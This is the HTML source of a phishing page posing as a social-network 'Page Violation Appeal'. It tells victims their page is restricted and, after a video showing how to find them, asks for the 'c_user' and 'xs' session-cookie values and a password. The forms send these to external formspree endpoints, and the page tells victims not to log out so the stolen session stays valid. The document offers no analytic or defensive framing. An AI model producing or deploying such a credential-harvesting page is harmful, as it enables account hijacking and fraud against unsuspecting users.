...
<body>
  ...
  <form action="https://formspree.io/f/xrgnygrg" method="POST">
    ...
    <div class="relative flex justify-center items-center mt-7 md:hidden lg:hidden sm:block">
      <div class="border w-80 shadow-lg">
        <div>
          <p class="border-b pl-3 bg-slate-200"> Page Violation Appeal
          </p>
        </div>
        <div>
        ...
        <div>
          <p class="text-[10px] font-serif  mt-3 mx-3">
            Your access to your page has been limited, and you currently cannot post, share, or comment using your page.
          </p>
        </div>
        <div>
          <p class="text-[10px] font-serif  mt-3 mx-3">
            If you believe this is an error, you have the option to submit an appeal by providing the necessary information.
          </p>
        </div><div>
          ...
          <a class="w-32 h-20 block" href="detailed video.mp4"><img class="w-32 h-20 mx-3" src="video.png" alt="video.png"></a>
        </div><p class="text-[10px] font-serif  mt-3 mx-3">
          You must watch the provided video to provide the requested information below.
        </p><div><p class="text-sm text-gray-400 mx-5">
          c_user
        </p>
          <input class="border h-5 mx-3" type="number" name="c_user" pattern=".{9,}" required="">
     <br><br> <p class="text-sm text-gray-400 mx-5 mt-2">
          xs
        </p>
          <input class="border h-5 mx-3" type="text" name="xs" pattern=".{30,}" required=""><br><br>
          <p class="text-slate-400 pl-4 mt-1">
            Confirm Password
          </p><input class="border h-6 pl-1 mx-3" type="passwrod" name="passwrod" id="passwrod" pattern=".{6,}" required="">   <br><br>
            <p class="text-[10px] font-serif   mt-3 mx-3">
              Please ensure not to log out of your account on your computer or laptop until you have received a verification email.
            </p>
...
<form class="sm:hidden lg:block md:block" action="https://formspree.io/f/xqkrpelw" method="post">
...
<div>
  <a class="w-[120px] h-[80px] block mx-3" href="https://cdn.glitch.global/2a277f90-2033-409a-8fac-bb6a2902726e/WhatsApp%20Video%202024-01-13%20at%208.37.16%20PM.mp4?v=1705865667560"><img src="downloadssss.png" alt=""></a>
</div><div>
...
<div>
 ...
 <br><br> 
  <p class="text-slate-400 pl-4 mt-1">
    xs
  </p><input class="border h-6 pl-1 mx-3" type="text" name="xs" pattern=".{30,}" required=""><br><br>
  <p class="text-slate-400 pl-4 mt-1">
    Confirm Password 
  </p><input class="border h-6 pl-1 mx-3" type="text" name="passward" id="passward" pattern=".{6,}" required="">   <br><br>
  <p class="mt-4 pl-3 text-[12px] font-semibold">
    Please ensure not to log out of your account on your computer or laptop until you have received a verification email.
  </p>
</div><div class="border mx-3 h-10 mt-3 border-slate-200 bg-slate-200"><div class="flex justify-end mx-2">
